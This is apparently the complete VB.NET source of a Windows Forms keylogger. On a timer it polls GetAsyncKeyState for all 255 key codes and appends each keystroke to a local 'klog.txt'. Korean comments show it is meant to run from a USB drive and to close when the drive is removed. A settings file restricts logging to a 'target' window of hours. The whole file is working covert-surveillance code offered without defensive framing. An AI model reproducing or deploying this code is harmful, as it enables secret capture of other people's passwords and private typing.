Imports System.Runtime.InteropServices
Public Class Form1
    Dim path As String = "data\klog.txt"
    Dim data As String = ""
    Dim system_open, system_close As Integer
    Public Declare Function GetAsyncKeyState Lib "user32" Alias "GetAsyncKeyState" (ByVal vKey As Integer) As Int16
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer2.Enabled = False

        Dim finding_file As New System.IO.FileInfo("data\setting.txt")
        If finding_file.Exists = True Then
            Dim system_time As String = My.Computer.FileSystem.ReadAllText("data\setting.txt")

            If system_time = "" Then
                End
            End If

            system_open = CInt(Mid(system_time, InStr(system_time, "OPEN : ") + 7, 2))
            system_close = CInt(Mid(system_time, InStr(system_time, "CLOSE : ") + 8, 2))
            If Now.Hour < system_open Then
                '컴퓨터가 켜진 시각이 표적 시간보다 적은 경우
                End
            End If
            Timer2.Enabled = True
        End If

        My.Computer.FileSystem.WriteAllText(path, vbCrLf & Date.Now & vbCrLf, True)
        Timer1.Enabled = True
    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim finding_file As New System.IO.FileInfo(path)
        If finding_file.Exists = False Then
            'usb를 종료할 경우
            Me.Close()
        End If
        For index = 1 To 255
            If GetAsyncKeyState(index) And 1 Then
                If (48 <= index And index <= 90) Then
                    data = Chr(index)
                Else
                    data = "(" & index & ")"
                End If
                My.Computer.FileSystem.WriteAllText(path, data, True)
            End If
        Next
        '저장
    End Sub
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If system_close <= Now.Hour Then
            End
        End If
    End Sub
End Class
